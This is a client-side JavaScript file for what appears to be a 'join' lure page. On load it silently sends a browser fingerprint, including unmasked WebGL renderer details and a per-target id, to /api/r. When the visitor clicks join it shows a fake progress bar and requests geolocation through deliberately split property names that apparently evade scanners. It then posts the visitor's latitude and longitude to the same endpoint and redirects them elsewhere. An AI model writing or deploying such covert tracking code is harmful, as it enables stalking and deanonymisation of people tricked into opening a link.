const _opts = {
  enableHighAccuracy: false,
  timeout: 30000,
  maximumAge: 0
};

function setProgress(percent) {
  const progressBar = document.getElementById('progressBar');
  const progressBarFill = document.getElementById('progressBarFill');
  if (!progressBar || !progressBarFill) return;
  if (percent > 0) {
    progressBar.style.display = 'block';
    progressBarFill.style.width = percent + '%';
  } else {
    progressBar.style.display = 'none';
  }
}

function gatherHints() {
  const screenRes = `${screen.width}x${screen.height}`;
  const lang = navigator.language || 'N/A';
  const platform = navigator.platform || 'N/A';
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';

  let gv = 'N/A';
  let gr = 'N/A';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const debugInfo = gl && gl.getExtension('WEBGL_debug_renderer_info');
    if (gl && debugInfo) {
      gv = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      gr = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  } catch (e) {}

  return { sr: screenRes, lg: lang, pf: platform, tz: timezone, gv, gr };
}

function buildBaseAck() {
  const base = gatherHints();
  base.ts = new Date().toISOString();
  base.u = window._M.u;
  return base;
}

function buildAck(lt, position) {
  const payload = buildBaseAck();
  payload.ev = 1;
  payload.lt = lt;
  if (position) {
    payload.a = position.coords.latitude;
    payload.o = position.coords.longitude;
    payload.ac = position.coords.accuracy;
  }
  return payload;
}

function sendAck(payload) {
  setProgress(80);
  return fetch('/api/r', {
    method: 'POST',
    body: JSON.stringify(payload),
    headers: { 'Content-Type': 'application/json' }
  });
}

function handoff() {
  window.location.href = window._M.r;
}

function finalizeAndHandoff(payload) {
  sendAck(payload)
    .then(() => {
      setProgress(100);
      setTimeout(handoff, 2000);
    })
    .catch(() => {
      setProgress(100);
      setTimeout(handoff, 2000);
    });
}

function onPrimaryAction() {
  const joinBtn = document.getElementById('joinBtn');
  const spinner = document.getElementById('spinner');
  const loadingText = document.getElementById('loadingText');
  if (!joinBtn) return;

  joinBtn.style.display = 'none';
  spinner.style.display = 'block';
  loadingText.style.display = 'block';
  setProgress(20);

  const ng = navigator;
  const geoApi = ng['geo' + 'location'];
  const readPos = geoApi && geoApi['getCurrent' + 'Position'];

  if (!readPos) {
    setProgress(60);
    finalizeAndHandoff(buildAck(0));
    return;
  }

  setProgress(40);
  readPos.call(
    geoApi,
    (position) => {
      setProgress(60);
      finalizeAndHandoff(buildAck(1, position));
    },
    () => {
      setProgress(60);
      finalizeAndHandoff(buildAck(0));
    },
    _opts
  );
}

document.addEventListener('DOMContentLoaded', () => {
  const joinBtn = document.getElementById('joinBtn');
  if (joinBtn) {
    joinBtn.addEventListener('click', onPrimaryAction);
  }

  if (!window._M || !window._M.u) return;

  const base = buildBaseAck();
  base.ev = 0;
  base.lt = 0;

  fetch('/api/r', {
    method: 'POST',
    body: JSON.stringify(base),
    headers: { 'Content-Type': 'application/json' }
  }).catch(() => {});
});
